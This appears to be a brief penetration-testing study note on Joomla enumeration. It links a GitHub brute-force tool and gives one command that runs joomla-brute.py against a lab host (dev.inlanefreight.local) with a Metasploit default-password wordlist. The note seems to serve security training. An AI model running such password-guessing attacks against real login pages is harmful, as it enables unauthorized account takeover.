# joomla-brute example

OS: Linux, Web
Description: Joomla Enumeration
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: joomla (https://www.notion.so/joomla-1444c8e5237680f8979add39119ffb43?pvs=21)
URL: https://github.com/ajnik/joomla-bruteforce/tree/master

```jsx
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <username or path to username list>
```